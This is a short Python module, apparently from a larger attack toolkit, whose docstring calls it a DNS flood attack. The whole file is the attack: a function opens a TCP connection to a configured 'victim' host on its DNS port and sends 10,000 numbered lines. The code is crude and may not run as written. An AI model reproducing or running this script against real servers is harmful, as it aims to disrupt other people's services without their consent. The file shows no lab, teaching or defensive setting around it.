"""
This script implements DNS flood attack.
"""

import socket

from .. import configs

# ATTACK
def dns_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((configs.victim, configs.DNS_PORT))

    for i in range(10000):
        sock.send("%s\n" % i)

    sock.close()


if __name__ == '__main__':
    dns_flood()
